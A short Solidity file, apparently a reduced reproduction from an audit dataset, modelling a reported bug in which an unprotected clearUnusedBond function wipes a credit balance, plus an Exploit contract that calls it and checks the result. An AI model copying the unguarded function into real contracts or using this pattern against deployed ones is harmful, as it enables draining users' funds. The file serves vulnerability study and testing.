// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 48699: Abacus clearUnusedBond drains credits. Reduced local model preserves the reported state transition.

contract Vulnerable {
    uint256 public creditsBonds = 100; function clearUnusedBond() external { creditsBonds = 0; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.clearUnusedBond(); success = bug.creditsBonds() == 0;
    }
}


